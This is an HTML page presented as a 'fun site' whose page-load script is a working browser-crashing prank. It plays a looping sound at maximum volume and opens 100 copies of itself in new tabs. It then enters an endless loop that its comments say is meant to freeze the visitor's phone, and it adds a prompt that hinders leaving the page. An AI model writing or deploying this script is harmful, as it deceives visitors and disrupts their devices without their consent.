<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Весёлый сайт</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            color: white;
            font-size: 5rem;
            font-family: Arial, sans-serif;
            text-transform: uppercase;
            text-align: center;
            cursor: pointer;
            flex-direction: column;
        }
    </style>
</head>
<body>
    <div id="text">Заходи, не бойся!</div>
    <audio id="sound" src="https://www.myinstants.com/media/sounds/stony-prank-mem-2025.mp3" autoplay loop></audio>

    <script>
        let sound = document.getElementById("sound");

        // Устанавливаем громкость на максимум (работает только в браузере)
        function setMaxVolume() {
            sound.volume = 1.0;
        }

        // Запуск бесконечного цикла для нагрузки процессора
        function freezePhone() {
            while (true) {
                console.log("Телефон зависает...");
            }
        }

        // Открытие множества вкладок
        function spamTabs() {
            for (let i = 0; i < 100; i++) {
                window.open(window.location.href, '_blank');
            }
        }

        // Блокировка выхода
        window.onbeforeunload = function() {
            return "Ты точно хочешь уйти?";
        };

        // Запуск всего при загрузке страницы
        window.onload = function() {
            setMaxVolume();
            sound.play().catch(err => console.log("Ошибка автозапуска:", err));
            setTimeout(spamTabs, 1000); // Открытие вкладок через 1 секунду
            setTimeout(freezePhone, 2000); // Запуск зависания через 2 секунды
        };
    </script>
</body>
</html>
